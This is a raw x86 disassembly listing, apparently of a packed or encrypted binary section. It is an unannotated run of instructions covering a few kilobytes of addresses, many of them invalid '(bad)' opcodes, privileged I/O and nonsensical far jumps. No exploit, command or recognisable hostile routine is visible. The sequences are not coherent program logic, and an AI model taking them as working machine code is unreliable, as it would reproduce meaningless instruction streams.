  40e88a:	aam    0x87
  40e88c:	or     BYTE PTR [ecx+0x43],dl
  40e88f:	jmp    0x5c3c:0x11e7b30b
  40e896:	mov    ds:0xe80242d0,al
  40e89b:	sbb    al,0x3
  40e89d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e89e:	jbe    0x40e893
  40e8a0:	lahf   
  40e8a1:	or     esp,DWORD PTR [ecx]
  40e8a3:	nop
  40e8a4:	ss call edi
  40e8a7:	icebp  
  40e8a8:	pop    esp
  40e8a9:	data16 sbb ah,BYTE PTR [eax-0x45]
  40e8ad:	test   DWORD PTR [edi-0x3c],esi
  40e8b0:	(bad)  
  40e8b1:	sub    BYTE PTR [esp+eiz*2-0x3706c3e8],cl
  40e8b8:	call   0xb1b3:0x3a2e95f3
  40e8bf:	or     DWORD PTR [ebx+0x6f74d906],ecx
  40e8c5:	stos   DWORD PTR es:[edi],eax
  40e8c6:	(bad)  
  40e8c7:	mov    esp,0xe728ced7
  40e8cc:	mov    al,ds:0x8876ba0a
  40e8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8d2:	ins    BYTE PTR es:[edi],dx
  40e8d3:	inc    eax
  40e8d4:	adc    ebp,DWORD PTR [ebx+0x5072c1a5]
  40e8da:	jmp    0x40ede5
  40e8df:	ds (bad) 
  40e8e1:	sar    BYTE PTR [edi],cl
  40e8e3:	(bad)  
  40e8e5:	rol    ebp,1
  40e8e7:	imul   edi,DWORD PTR [ebp+0x80e749e],0x490489b0
  40e8f1:	js     0x40e96b
  40e8f3:	push   0x7c
  40e8f5:	js     0x40e96f
  40e8f7:	shl    DWORD PTR [ebp+0x63adc541],0x63
  40e8fe:	mov    es,eax
  40e900:	mov    bl,0x8b
  40e902:	retf   0x685c
  40e905:	sub    eax,0x5bdfc4af
  40e90a:	fld    DWORD PTR [ebx-0x27e653ba]
  40e910:	cwde   
  40e911:	jp     0x40e899
  40e913:	mov    cs,WORD PTR es:[ebx+0x3b3bd007]
  40e91a:	cmp    al,0xec
  40e91c:	xor    BYTE PTR [ebx+0x58],0xa5
  40e920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e921:	pop    esp
  40e922:	push   cs
  40e923:	ds hlt 
  40e925:	xor    DWORD PTR [edi+0x9f19368],esp
  40e92b:	fsub   st(3),st
  40e92d:	push   cs
  40e92e:	pop    edi
  40e92f:	cmp    DWORD PTR [eax+edi*4-0x9],eax
  40e933:	mov    eax,0x9d763806
  40e938:	dec    ecx
  40e939:	mov    edx,0xe5aeb9dd
  40e93e:	inc    edi
  40e93f:	xchg   esi,eax
  40e940:	mov    WORD PTR [ebp+0x56894f39],fs
  40e946:	dec    esp
  40e947:	dec    esi
  40e948:	dec    ecx
  40e949:	dec    eax
  40e94a:	out    0x31,eax
  40e94c:	dec    DWORD PTR [ecx+0x64]
  40e94f:	stos   BYTE PTR es:[edi],al
  40e950:	fbld   TBYTE PTR [eax+eiz*4-0xbbc5612]
  40e957:	adc    bl,al
  40e959:	aas    
  40e95a:	sub    cl,BYTE PTR [edx-0x17]
  40e95d:	mov    ch,0xe8
  40e95f:	popf   
  40e960:	xchg   BYTE PTR [edx],dh
  40e962:	fwait
  40e963:	ror    DWORD PTR [edx+ecx*4],1
  40e966:	hlt    
  40e967:	leave  
  40e968:	inc    esp
  40e969:	sbb    BYTE PTR [edx],dh
  40e96b:	pop    ebp
  40e96c:	imul   edx,DWORD PTR [edi],0xffffffe7
  40e96f:	jl     0x40e915
  40e971:	mov    bh,0x52
  40e973:	shl    BYTE PTR [esi-0x5c],cl
  40e976:	mov    edx,0x6bc9f44f
  40e97b:	dec    ecx
  40e97c:	leave  
  40e97d:	cmp    al,0xba
  40e97f:	enter  0xb147,0xa3
  40e983:	bound  esp,QWORD PTR ds:0xd7ee4319
  40e989:	dec    edi
  40e98a:	stos   BYTE PTR es:[edi],al
  40e98b:	pop    ebp
  40e98c:	jle    0x40e9af
  40e98e:	sub    eax,0x235aa1ac
  40e993:	rol    BYTE PTR [esi-0x1],cl
  40e996:	pop    edi
  40e997:	and    esp,ebx
  40e999:	inc    ecx
  40e99a:	dec    edx
  40e99b:	fdivr  st,st(0)
  40e99d:	retf   0x55f5
  40e9a0:	ret    
  40e9a1:	adc    ecx,DWORD PTR [ecx+edx*1+0x7205a40e]
  40e9a8:	aad    0xe8
  40e9aa:	xchg   ebx,eax
  40e9ab:	pop    ebx
  40e9ac:	lahf   
  40e9ad:	(bad)  
  40e9ae:	adc    DWORD PTR [eax+0x6a3686fc],esp
  40e9b4:	(bad)  
  40e9b6:	dec    eax
  40e9b7:	pop    esp
  40e9b8:	je     0x40ea2f
  40e9ba:	aas    
  40e9bb:	jns    0x40e997
  40e9bd:	lods   eax,DWORD PTR ds:[esi]
  40e9be:	daa    
  40e9bf:	adc    eax,0xf8ff2f19
  40e9c4:	cld    
  40e9c5:	ret    0x31fe
  40e9c8:	and    bl,BYTE PTR [edx]
  40e9ca:	fistp  QWORD PTR [ebx-0x61c47001]
  40e9d0:	and    al,0xf9
  40e9d2:	sub    BYTE PTR [esi],cl
  40e9d4:	loop   0x40ea55
  40e9d6:	addr16 push ebx
  40e9d8:	push   ss
  40e9d9:	xchg   edx,eax
  40e9da:	je     0x40e9e9
  40e9dc:	jle    0x40e990
  40e9de:	icebp  
  40e9df:	pusha  
  40e9e0:	mov    esi,0x582e1760
  40e9e5:	test   eax,0x9b59c433
  40e9ea:	mov    ds:0x7bf559fd,al
  40e9ef:	sub    DWORD PTR [esi+0x12],eax
  40e9f2:	test   eax,0xa5cc8386
  40e9f7:	shr    BYTE PTR [edx+0x26],1
  40e9fa:	mov    eax,0x3b54f4a6
  40e9ff:	inc    eax
  40ea00:	xchg   ebx,eax
  40ea01:	ins    DWORD PTR es:[edi],dx
  40ea02:	sub    BYTE PTR [ebp+ecx*1+0x2e5cc84e],dh
  40ea09:	mov    al,ds:0x1325a5e6
  40ea0e:	mov    eax,esp
  40ea10:	or     bl,BYTE PTR [esi+0x650dafd4]
  40ea16:	fnstsw WORD PTR [eax+ebp*1-0x44]
  40ea1a:	push   0xb145a46d
  40ea1f:	cmc    
  40ea20:	shl    BYTE PTR [eax-0x6f66be22],1
  40ea26:	adc    eax,0xc2fe92dd
  40ea2b:	mov    edi,0xfcf14c3f
  40ea30:	in     al,dx
  40ea31:	gs xor eax,0x2e9110d4
  40ea37:	cmp    edx,DWORD PTR [esi]
  40ea39:	test   BYTE PTR [edi],0x6d
  40ea3c:	sbb    BYTE PTR [ecx-0x6f000b12],dh
  40ea42:	retf   
  40ea43:	lea    ecx,[edx]
  40ea45:	or     DWORD PTR [esi+0x39c3429a],0xa034d1f1
  40ea4f:	mov    ss,WORD PTR [ecx-0xe784a4e]
  40ea55:	push   cs
  40ea56:	sbb    dl,BYTE PTR [eax-0x41]
  40ea59:	dec    ecx
  40ea5a:	(bad)  
  40ea5b:	scas   eax,DWORD PTR es:[edi]
  40ea5c:	(bad)  [eax]
  40ea5e:	repnz cld 
  40ea60:	int    0x83
  40ea62:	sub    BYTE PTR [eax+eax*2-0x78],al
  40ea66:	(bad)  
  40ea67:	mov    BYTE PTR [ebx+0x6a498e40],dh
  40ea6d:	ja     0x40ea8d
  40ea6f:	stos   DWORD PTR es:[edi],eax
  40ea70:	(bad)  
  40ea71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea72:	add    esi,DWORD PTR [esi+eax*8-0x1da66771]
  40ea79:	jnp    0x40ea50
  40ea7b:	dec    esi
  40ea7c:	cs call 0x29f07f81
  40ea82:	mov    ds:0xd084a84a,eax
  40ea87:	repz jnp 0x40ea74
  40ea8a:	xchg   esi,eax
  40ea8b:	add    DWORD PTR [edx-0x39],edi
  40ea8e:	jo     0x40ea2f
  40ea90:	mov    eax,0x281ac217
  40ea95:	xchg   DWORD PTR [edx+0x3bf91eb0],esi
  40ea9b:	fs test edx,esp
  40ea9e:	xchg   ebp,eax
  40ea9f:	or     BYTE PTR [edx-0x618edb2e],0x45
  40eaa6:	fiadd  WORD PTR [edi-0x3ccc1dcc]
  40eaac:	pop    edi
  40eaad:	xchg   esi,eax
  40eaae:	stc    
  40eaaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eab0:	test   BYTE PTR ds:0x331fc4de,cl
  40eab6:	jmp    0x40eaec
  40eab8:	(bad)  
  40eab9:	mov    dh,0x30
  40eabb:	ret    
  40eabc:	ja     0x40ea47
  40eabe:	out    dx,al
  40eabf:	xor    eax,0x4185d6e3
  40eac4:	in     eax,dx
  40eac5:	fistp  QWORD PTR [ecx-0x1c41b851]
  40eacb:	pop    eax
  40eacc:	mov    al,0x4a
  40eace:	pop    esi
  40eacf:	pop    esi
  40ead0:	pop    edi
  40ead1:	xchg   edx,eax
  40ead2:	or     DWORD PTR [edi],edi
  40ead4:	retf   
  40ead5:	adc    al,0x7d
  40ead7:	xchg   ebx,eax
  40ead8:	ins    DWORD PTR es:[edi],dx
  40ead9:	mov    ch,BYTE PTR ds:0xa3c37ce7
  40eadf:	ins    DWORD PTR es:[edi],dx
  40eae0:	aaa    
  40eae1:	sub    eax,0x5b3ade11
  40eae6:	das    
  40eae7:	mov    ebx,0xc6f5b523
  40eaec:	mov    eax,ds:0xf46d0ae
  40eaf1:	in     al,0x50
  40eaf3:	xchg   ch,dh
  40eaf5:	daa    
  40eaf6:	pop    edx
  40eaf7:	adc    BYTE PTR [edx+eax*4],al
  40eafa:	mov    ch,0xf0
  40eafc:	inc    ebx
  40eafd:	or     al,0xae
  40eaff:	nop
  40eb00:	les    esp,FWORD PTR [ebp-0x66f7d573]
  40eb06:	int    0x73
  40eb08:	pop    ds
  40eb09:	push   edi
  40eb0a:	iret   
  40eb0b:	or     edx,ecx
  40eb0d:	cmp    DWORD PTR [esi+ebp*1],ebp
  40eb10:	out    0xef,al
  40eb12:	cmp    esp,DWORD PTR [eax]
  40eb14:	add    BYTE PTR [edx-0x42],ch
  40eb17:	scas   al,BYTE PTR es:[edi]
  40eb18:	cld    
  40eb19:	js     0x40eb53
  40eb1b:	(bad)  
  40eb1c:	loope  0x40eaeb
  40eb1e:	jne    0x40eac4
  40eb20:	in     eax,0x53
  40eb22:	xchg   DWORD PTR [esi+0x44],ebx
  40eb25:	popa   
  40eb26:	xchg   ebp,eax
  40eb27:	adc    ecx,edi
  40eb29:	sbb    edi,DWORD PTR [edx]
  40eb2b:	leave  
  40eb2c:	rol    DWORD PTR [edi+0x59acf53f],1
  40eb32:	out    0x45,al
  40eb34:	mov    ecx,0x536ca66a
  40eb39:	out    dx,eax
  40eb3a:	cmp    bh,al
  40eb3c:	ins    BYTE PTR es:[edi],dx
  40eb3d:	out    dx,eax
  40eb3e:	push   0x4ee3f411
  40eb43:	push   ecx
  40eb44:	cli    
  40eb45:	and    esp,ebp
  40eb47:	or     ebp,DWORD PTR [edi+esi*2]
  40eb4a:	or     ebx,edi
  40eb4c:	test   DWORD PTR [edi+0x61c5cbf7],ebp
  40eb52:	cmp    eax,0x2644bf0
  40eb57:	or     esp,DWORD PTR [eax]
  40eb59:	push   ebx
  40eb5a:	ror    DWORD PTR [eax-0x2682b78c],0x2a
  40eb61:	push   dx
  40eb63:	gs js  0x40ebc9
  40eb66:	pop    ecx
  40eb67:	outs   dx,DWORD PTR ds:[esi]
  40eb68:	call   0xd5f2f9ad
  40eb6d:	je     0x40ebad
  40eb6f:	inc    esi
  40eb70:	pop    ebp
  40eb71:	cli    
  40eb72:	(bad)  
  40eb74:	in     eax,0xb4
  40eb76:	or     DWORD PTR [ebx+0x5782e650],ebp
  40eb7c:	jmp    0x9ccb:0xaa7c37ba
  40eb83:	mov    ecx,0x5a1db65d
  40eb88:	jne    0x40ebc6
  40eb8a:	push   esp
  40eb8b:	sbb    ecx,edi
  40eb8d:	cmp    BYTE PTR [esi-0xd],ch
  40eb90:	sub    DWORD PTR [edx+0x61],eax
  40eb93:	jmp    0x6a0a3165
  40eb98:	mov    esi,0x3bf5a545
  40eb9d:	pop    ebx
  40eb9e:	repz (bad) 
  40eba0:	push   esp
  40eba1:	enter  0xa88,0xb9
  40eba5:	mov    eax,0xb1ae0665
  40ebaa:	imul   eax,DWORD PTR [edi+0x2b],0xf547cd74
  40ebb1:	fsubr  QWORD PTR [edx-0x210909a6]
  40ebb7:	data16 mov dh,0xf8
  40ebba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebbb:	ins    BYTE PTR es:[edi],dx
  40ebbc:	mov    bh,0x5c
  40ebbe:	xchg   ebp,eax
  40ebbf:	shl    al,0x59
  40ebc2:	jl     0x40ec2b
  40ebc4:	push   cs
  40ebc5:	repz mov esp,edx
  40ebc8:	inc    ebp
  40ebc9:	je     0x40ebed
  40ebcb:	jno    0x40eb7d
  40ebcd:	adc    al,0x82
  40ebcf:	pop    esp
  40ebd0:	and    DWORD PTR [esi-0x70],0xffffffa5
  40ebd4:	pushf  
  40ebd5:	sbb    ah,BYTE PTR [edi+0x8927797]
  40ebdb:	adc    al,0x5
  40ebdd:	ins    BYTE PTR es:[edi],dx
  40ebde:	xchg   esi,eax
  40ebdf:	pop    edi
  40ebe0:	fbstp  TBYTE PTR ss:[esi]
  40ebe3:	das    
  40ebe4:	cmp    al,BYTE PTR [edi+edx*8]
  40ebe7:	dec    ecx
  40ebe8:	push   ds
  40ebe9:	or     al,0xbe
  40ebeb:	repnz in eax,0xa5
  40ebee:	aam    0xe1
  40ebf0:	lods   eax,DWORD PTR ds:[esi]
  40ebf1:	lahf   
  40ebf2:	mov    esp,0xace6418a
  40ebf7:	xlat   BYTE PTR ds:[ebx]
  40ebf8:	push   0x13
  40ebfa:	mov    ch,0x1
  40ebfc:	vaddsd xmm2,xmm6,QWORD PTR [ecx]
  40ec00:	or     al,0x52
  40ec02:	sub    edi,DWORD PTR ds:0x6defa82e
  40ec08:	outs   dx,DWORD PTR ds:[esi]
  40ec09:	repnz mov ecx,0xfcf7f55c
  40ec0f:	rcl    esp,1
  40ec11:	(bad)  
  40ec12:	push   ss
  40ec13:	push   ds
  40ec14:	lods   eax,DWORD PTR ds:[esi]
  40ec15:	mov    edx,0xc9832714
  40ec1a:	mov    bh,0xe5
  40ec1c:	sbb    DWORD PTR [eax],edx
  40ec1e:	add    al,BYTE PTR [edi+0x5f916915]
  40ec24:	inc    edx
  40ec25:	inc    eax
  40ec26:	adc    BYTE PTR [edx+0x56],dl
  40ec29:	arpl   sp,sp
  40ec2b:	std    
  40ec2c:	mov    esp,0xd74c6af3
  40ec31:	not    BYTE PTR [eax-0xa]
  40ec34:	jle    0x40ebd7
  40ec36:	inc    esp
  40ec37:	xor    DWORD PTR [esi+0x7f],edi
  40ec3a:	adc    eax,0xe540a22b
  40ec3f:	lahf   
  40ec40:	inc    edx
  40ec41:	push   esi
  40ec42:	xlat   BYTE PTR ds:[ebx]
  40ec43:	shr    DWORD PTR [ecx+edi*4-0x7573b9ae],0xb3
  40ec4b:	sbb    al,0x91
  40ec4d:	or     DWORD PTR [esi],ebp
  40ec4f:	pop    ebx
  40ec50:	popa   
  40ec51:	xor    BYTE PTR [edi],bl
  40ec53:	xchg   esi,eax
  40ec54:	enter  0xa660,0xc1
  40ec58:	adc    BYTE PTR [esi-0x179ea46],al
  40ec5e:	sbb    al,0x1e
  40ec60:	pop    eax
  40ec61:	dec    esp
  40ec62:	dec    esp
  40ec63:	es cli 
  40ec65:	fimul  DWORD PTR gs:[edx+0x5f]
  40ec69:	clc    
  40ec6a:	and    DWORD PTR [ecx],esp
  40ec6c:	mov    edi,0x1d6fed7d
  40ec71:	mov    ebx,0x4e2e0b07
  40ec76:	mov    ds:0x22486720,al
  40ec7b:	push   esi
  40ec7c:	add    ebx,ebp
  40ec7e:	mov    esp,0xcaa5186b
  40ec83:	fld    DWORD PTR ds:0x2c891e37
  40ec89:	dec    ebx
  40ec8a:	xlat   BYTE PTR ds:[ebx]
  40ec8b:	mov    al,0xf9
  40ec8d:	adc    eax,DWORD PTR [edx+edi*1-0x78]
  40ec91:	adc    edx,DWORD PTR [esp+ebp*2-0x352bb19b]
  40ec98:	and    ebp,esp
  40ec9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec9b:	stc    
  40ec9c:	inc    eax
  40ec9d:	jp     0x40eccc
  40ec9f:	test   al,0x1c
  40eca1:	mov    ds:0xab6f90ee,al
  40eca6:	sbb    al,0xaf
  40eca8:	in     eax,0xe9
  40ecaa:	mov    ch,0xdb
  40ecac:	mov    dl,0x1c
  40ecae:	inc    ebp
  40ecaf:	ins    BYTE PTR es:[edi],dx
  40ecb0:	jmp    0xb2156a51
  40ecb5:	jmp    FWORD PTR [edx-0x28335d16]
  40ecbb:	cmc    
  40ecbc:	je     0x40ec74
  40ecbe:	pop    edi
  40ecbf:	into   
  40ecc0:	out    0x2e,eax
  40ecc2:	(bad)  
  40ecc3:	cdq    
  40ecc4:	retf   0x945a
  40ecc7:	ret    0x7a74
  40ecca:	mov    dl,0xcf
  40eccc:	sub    bh,BYTE PTR [edi+0x75]
  40eccf:	sub    eax,0x6f8a938c
  40ecd4:	sub    bh,BYTE PTR [edi]
  40ecd6:	fs xchg edi,eax
  40ecd8:	push   0x3c
  40ecda:	sar    DWORD PTR [edi],0x1d
  40ecdd:	addr16 call 0x9984c929
  40ece3:	leave  
  40ece4:	mov    ebp,0x1382d369
  40ece9:	hlt    
  40ecea:	push   ds
  40eceb:	pop    edx
  40ecec:	dec    edi
  40eced:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecee:	mov    ch,0x69
  40ecf0:	push   edx
  40ecf1:	jo     0x40ed64
  40ecf3:	cmp    BYTE PTR ds:0xe0bc0e8e,cl
  40ecf9:	xchg   edx,eax
  40ecfa:	mov    edi,0xd949b808
  40ecff:	pop    ss
  40ed00:	cli    
  40ed01:	adc    BYTE PTR [eax+0x79763c63],ah
  40ed07:	inc    edx
  40ed08:	dec    edx
  40ed09:	loop   0x40ecdb
  40ed0b:	cmc    
  40ed0c:	jge    0x40ed0d
  40ed0e:	push   edx
  40ed0f:	push   esp
  40ed10:	lahf   
  40ed11:	push   ss
  40ed12:	or     eax,DWORD PTR [ebp-0x673b5e27]
  40ed18:	jp     0x40ed06
  40ed1a:	push   edx
  40ed1b:	nop
  40ed1c:	xchg   edi,eax
  40ed1d:	nop
  40ed1e:	and    ecx,ebx
  40ed20:	iret   
  40ed21:	jb     0x40ed9e
  40ed23:	xchg   edi,eax
  40ed24:	jno    0x40ecde
  40ed26:	adc    edi,edi
  40ed28:	int    0x7a
  40ed2a:	sar    dl,1
  40ed2c:	add    eax,0x2b744afc
  40ed31:	xor    edx,DWORD PTR [edx]
  40ed33:	scas   eax,DWORD PTR es:[edi]
  40ed34:	sub    BYTE PTR [esp+ebx*8],0x7c
  40ed38:	mov    edx,0xdee35e8
  40ed3d:	inc    edi
  40ed3e:	cmp    edi,DWORD PTR [esi]
  40ed40:	pop    ss
  40ed41:	cmc    
  40ed42:	sub    al,0x9b
  40ed44:	test   al,0x72
  40ed46:	or     DWORD PTR [edi+0x44f5341],eax
  40ed4c:	fldenv [edx]
  40ed4e:	pusha  
  40ed4f:	les    esp,FWORD PTR [edi]
  40ed51:	push   ds
  40ed52:	popf   
  40ed53:	stos   BYTE PTR es:[edi],al
  40ed54:	daa    
  40ed55:	lods   al,BYTE PTR ds:[esi]
  40ed56:	(bad)  
  40ed57:	push   ecx
  40ed58:	sti    
  40ed59:	jmp    0x40ecea
  40ed5b:	int3   
  40ed5c:	add    dh,0x67
  40ed5f:	sub    esi,DWORD PTR [ebp+0xa]
  40ed62:	mov    eax,0x49cf1d24
  40ed67:	aas    
  40ed68:	cmp    DWORD PTR [ecx+eax*1],eax
  40ed6b:	fsubrp st(1),st
  40ed6d:	mov    ah,0x79
  40ed6f:	mov    bh,0x93
  40ed71:	es stos DWORD PTR es:[edi],eax
  40ed73:	mov    edx,0xe87f07b6
  40ed78:	or     eax,0x63c00629
  40ed7d:	pop    edi
  40ed7e:	sbb    dl,0x75
  40ed81:	jno    0x40ed93
  40ed83:	sbb    eax,0x93a73ef0
  40ed88:	jl     0x40edd5
  40ed8a:	lahf   
  40ed8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed8c:	adc    eax,0x893d2c38
  40ed91:	fisubr WORD PTR [ebx-0x57]
  40ed94:	or     bh,al
  40ed96:	or     eax,ebp
  40ed98:	in     eax,0xb0
  40ed9a:	sbb    DWORD PTR [esi],esp
  40ed9c:	inc    esi
  40ed9d:	jne    0x40ed71
  40ed9f:	or     al,al
  40eda1:	test   BYTE PTR gs:[ebp*1+0x59c16054],0x65
  40edaa:	mov    bh,0x7e
  40edac:	sahf   
  40edad:	mov    BYTE PTR [ebx],cl
  40edaf:	outs   dx,DWORD PTR ds:[esi]
  40edb0:	rcr    BYTE PTR [eax-0xb1beef5],1
  40edb6:	sbb    eax,0xafe0d28f
  40edbb:	sar    BYTE PTR [ebp*2-0x765a51b5],0x43
  40edc3:	aad    0xb5
  40edc5:	dec    eax
  40edc6:	loope  0x40edaf
  40edc8:	jo     0x40ed6c
  40edca:	adc    ebx,ebp
  40edcc:	mov    edx,0xe7ba9914
  40edd1:	fs xor al,ch
  40edd4:	sahf   
  40edd5:	cmp    al,0xd
  40edd7:	jbe    0x40ee08
  40edd9:	adc    al,BYTE PTR [ebp-0x75]
  40eddc:	xor    eax,0x82079fe8
  40ede1:	lods   eax,DWORD PTR cs:[esi]
  40ede3:	mov    WORD PTR [edx],fs
  40ede5:	mov    eax,DWORD PTR [ebp-0x1c]
  40ede8:	jmp    0x40f2f3
  40eded:	iret   
  40edee:	iret   
  40edef:	rol    bl,cl
  40edf1:	rol    cl,cl
  40edf3:	int    0xd3
  40edf5:	fldenv [ebp-0x2bb9f693]
  40edfb:	ret    
  40edfc:	dec    ebp
  40edfd:	jbe    0x40ee4c
  40edff:	js     0x40ee79
  40ee01:	push   0x7c
  40ee03:	js     0x40ee7d
  40ee05:	cmp    DWORD PTR [ebx-0x3cd231b1],ecx
  40ee0b:	cmp    eax,ecx
  40ee0d:	jp     0x40eddf
  40ee0f:	mov    ebx,0xc6795640
  40ee14:	leave  
  40ee15:	xor    cl,dl
  40ee17:	enter  0x39a0,0x7d
  40ee1b:	xchg   DWORD PTR [ebp-0x57],ebp
  40ee1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee1f:	and    DWORD PTR [ecx+0x6ddd9f74],edi
  40ee25:	xchg   ebx,eax
  40ee26:	add    ah,BYTE PTR [esi+0x30]
  40ee29:	jb     0x40edc4
  40ee2b:	aam    0x7
  40ee2d:	and    eax,DWORD PTR [eax+ebx*8+0x781f6b34]
  40ee34:	loop   0x40ee53
  40ee36:	and    ebx,esi
  40ee38:	sub    eax,DWORD PTR [ebx-0xdfde3a1]
  40ee3e:	in     eax,0xce
  40ee40:	xor    al,0xb6
  40ee42:	push   edx
  40ee43:	jns    0x40ee41
  40ee45:	mov    bh,0x3
  40ee47:	xacquire xchg DWORD PTR [ebx-0x19319242],ecx
  40ee4e:	xor    DWORD PTR [ebp-0x62],0x9b8ff845
  40ee55:	push   esp
  40ee56:	and    cl,dl
  40ee58:	loop   0x40ee15
  40ee5a:	dec    ebp
  40ee5b:	or     ebp,esp
  40ee5d:	xor    eax,0xe83f5464
  40ee62:	sbb    al,0x97
  40ee64:	es cs pop esi
  40ee67:	sub    al,dl
  40ee69:	dec    esp
  40ee6a:	mov    bl,0x58
  40ee6c:	push   es
  40ee6d:	fcmovnb st,st(0)
  40ee6f:	bound  edx,QWORD PTR ds:0xaaadb058
  40ee75:	mov    eax,0x83d7e4f4
  40ee7a:	out    0x52,eax
  40ee7c:	inc    edi
  40ee7d:	loop   0x40eeb5
  40ee7f:	xlat   BYTE PTR ds:[bx]
  40ee81:	mov    dl,0x46
  40ee83:	ror    ebx,1
  40ee85:	jmp    DWORD PTR [edi+0x6c2be38a]
  40ee8b:	inc    ecx
  40ee8c:	push   cs
  40ee8d:	sub    eax,0x1ebf8415
  40ee92:	cmp    eax,0xd244761f
  40ee97:	aaa    
  40ee98:	push   0xfffffffc
  40ee9a:	mov    ds:0xda7047c,eax
  40ee9f:	push   esp
  40eea0:	jl     0x40ee68
  40eea2:	js     0x40ee8a
  40eea4:	ffreep st(7)
  40eea6:	popa   
  40eea7:	xchg   ebx,eax
  40eea8:	iret   
  40eea9:	or     esp,ebx
  40eeab:	ret    
  40eeac:	sub    DWORD PTR [ebx+0x13],esi
  40eeaf:	mov    esi,0x92df2882
  40eeb4:	popa   
  40eeb5:	(bad)  
  40eeb6:	(bad)  
  40eeb7:	leave  
  40eeb8:	(bad)  
  40eeba:	rcr    DWORD PTR [ecx+0x1087312f],1
  40eec0:	lea    ebp,[edx+ecx*8+0x11]
  40eec4:	int3   
  40eec5:	inc    ebx
  40eec6:	push   ebx
  40eec7:	sar    DWORD PTR [ebx+edx*1+0x268337c6],1
  40eece:	aam    0xc0
  40eed0:	ss cmp bl,dl
  40eed3:	jl     0x40ee5c
  40eed5:	popf   
  40eed6:	gs (bad) 
  40eed8:	xchg   DWORD PTR [edi+ebp*8],esi
  40eedb:	inc    edx
  40eedc:	mov    ds:0xcef11bc,eax
  40eee1:	cmp    DWORD PTR [ebx],eax
  40eee3:	push   ebx
  40eee4:	popa   
  40eee5:	sahf   
  40eee6:	and    al,BYTE PTR [ecx]
  40eee8:	fadd   DWORD PTR [esi+0x6f]
  40eeeb:	rol    BYTE PTR [edx-0x5d38e677],cl
  40eef1:	mov    esp,0x7fd578e2
  40eef6:	and    BYTE PTR [esi],cl
  40eef8:	push   es
  40eef9:	mov    eax,0x49b8113f
  40eefe:	inc    edx
  40eeff:	mov    ah,0x61
  40ef01:	cmp    BYTE PTR [esi+eax*1-0x6a],bh
  40ef05:	push   0x41c21db2
  40ef0a:	inc    edi
  40ef0b:	sub    eax,0xd870a9b2
  40ef10:	jecxz  0x40ef64
  40ef12:	mov    eax,0x155faeb2
  40ef17:	(bad)  
  40ef18:	rcr    BYTE PTR [edi],cl
  40ef1a:	es add esi,edx
  40ef1d:	stos   BYTE PTR es:[edi],al
  40ef1e:	inc    esi
  40ef1f:	pop    ebp
  40ef20:	jbe    0x40eeb4
  40ef22:	dec    ebp
  40ef23:	sbb    al,0x21
  40ef25:	loope  0x40ef02
  40ef27:	adc    BYTE PTR [eax-0x50],bh
  40ef2a:	add    al,0x77
  40ef2c:	(bad)
  40ef2f:	sub    dh,BYTE PTR [eax+0x4e397a7c]
  40ef35:	loope  0x40ef4e
  40ef37:	sahf   
  40ef38:	int    0xe7
  40ef3a:	pop    es
  40ef3b:	add    eax,0x1e915a2d
  40ef40:	jge    0x40ef98
  40ef42:	loopne 0x40ef8f
  40ef44:	pop    es
  40ef45:	es int3 
  40ef47:	gs inc eax
  40ef4a:	xchg   BYTE PTR [ebp+0x1eaf8abb],dl
  40ef50:	loopne 0x40eef6
  40ef52:	cmp    al,bl
  40ef54:	lea    ecx,[edx-0xb917205]
  40ef5a:	sbb    BYTE PTR [ecx+0x29d3151a],0xe8
  40ef61:	loopne 0x40eef9
  40ef63:	test   BYTE PTR [ebx],bh
  40ef65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef66:	add    eax,0x48f9850e
  40ef6b:	mov    esi,0xd80faca8
  40ef70:	ins    DWORD PTR es:[edi],dx
  40ef71:	jg     0x40ef52
  40ef73:	xchg   ecx,eax
  40ef74:	sti    
  40ef75:	dec    esp
  40ef76:	pusha  
  40ef77:	mov    ah,0xae
  40ef79:	sub    BYTE PTR [ebx+0x28b8294],al
  40ef7f:	leave  
  40ef80:	or     ah,BYTE PTR [edx+0x7bf2184c]
  40ef86:	push   edx
  40ef87:	sbb    ch,BYTE PTR [eax]
  40ef89:	call   0x19f:0x87521c48
  40ef90:	lea    edi,[edx+edi*4]
  40ef93:	(bad)  
  40ef94:	dec    edi
  40ef95:	mov    ebp,0x74ab0ed5
  40ef9a:	pop    edx
  40ef9b:	test   eax,0x5336469b
  40efa0:	ret    0x4abf
  40efa3:	aaa    
  40efa4:	dec    ebp
  40efa5:	mov    dh,BYTE PTR [ecx+0x399b83bc]
  40efab:	push   cs
  40efac:	(bad)  
  40efad:	dec    ebp
  40efae:	dec    esp
  40efaf:	push   es
  40efb0:	mov    ebx,DWORD PTR [ebx+0x39]
  40efb3:	fwait
  40efb4:	xchg   ecx,eax
  40efb5:	call   0x8035d350
  40efba:	aaa    
  40efbb:	ins    DWORD PTR es:[edi],dx
  40efbc:	ficomp DWORD PTR [ebp+0x52]
  40efbf:	lods   al,BYTE PTR ds:[esi]
  40efc0:	push   ebx
  40efc1:	pop    edx
  40efc2:	bound  esi,QWORD PTR [ebx]
  40efc4:	jmp    0x40ef5b
  40efc6:	hlt    
  40efc7:	outs   dx,DWORD PTR ds:[esi]
  40efc8:	lds    ebp,FWORD PTR [edx+ebp*1+0x31]
  40efcc:	sbb    ch,BYTE PTR ds:0x73d9783c
  40efd2:	cmp    edi,DWORD PTR [edx]
  40efd4:	ret    
  40efd5:	js     0x40eff2
  40efd7:	scas   al,BYTE PTR es:[edi]
  40efd8:	push   edi
  40efd9:	int    0x4f
  40efdb:	add    DWORD PTR [edi],esi
  40efdd:	jmp    0x40f047
  40efdf:	jne    0x40f032
  40efe1:	stc    
  40efe2:	in     eax,0x62
  40efe4:	or     ebp,DWORD PTR [edx]
  40efe6:	inc    edx
  40efe7:	jg     0x40f032
  40efe9:	ds push 0xffffffee
  40efec:	popa   
  40efed:	fisub  WORD PTR [ebp+eax*1+0x30633dd9]
  40eff4:	dec    ebp
